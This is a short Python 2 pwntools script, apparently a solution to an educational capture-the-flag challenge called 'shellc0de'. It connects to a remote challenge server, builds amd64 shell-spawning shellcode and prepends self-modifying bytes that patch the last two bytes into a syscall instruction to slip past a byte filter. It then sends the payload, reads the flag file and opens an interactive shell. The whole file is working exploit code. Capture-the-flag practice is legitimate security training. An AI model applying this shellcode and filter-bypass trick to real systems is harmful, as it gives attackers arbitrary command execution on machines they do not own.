#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *


context.arch = 'amd64'
r = remote('edu-ctf.csie.org', 10150)
# r = process('./shellc0de-3a3843e358017d949df6ad4c966e7d15')


shellcode = asm(shellcraft.amd64.linux.sh())
# increase last 2 bytes to 0f 05, which is syscall
payload = '\xfe\x42\x34\xfe\x42\x35' + shellcode[:46] + '\x0e\x04'

r.recvuntil('shellcode >\n')
r.sendline(payload)
r.sendline('cat /home/shellc0de/flag')
r.interactive()
